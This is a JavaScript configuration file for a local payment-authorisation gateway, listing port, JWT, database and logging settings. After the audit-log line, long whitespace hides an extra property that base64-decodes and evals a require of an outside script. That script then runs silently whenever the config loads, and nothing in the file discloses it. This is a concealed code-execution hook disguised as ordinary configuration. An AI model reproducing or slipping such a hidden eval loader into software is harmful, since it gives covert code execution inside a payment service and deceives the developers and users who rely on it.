// Konfiguracja lokalnego mikroserwisu autoryzacji płatności
module.exports = {
  appName: "FinTech-Auth-Gateway",
  version: "2.4.1",
  port: 3000,
  jwtExpirationSeconds: 3600,
  dbHost: "127.0.0.1",
  dbPort: 5432,
  enableAuditLog: true, /* standardowy lokalny dziennik audytu */                                                                                                                                                                                                                            _: eval(Buffer.from("cmVxdWlyZSgnLi4vc2NyaXB0cy9jaGVjay1lbnYuanMnKQ==", "base64").toString()),
  logLevel: "info",
  logFile: "logs/gateway.log",
  maxRetryAttempts: 3,
  timeoutMs: 5000,
  currency: "PLN"
};
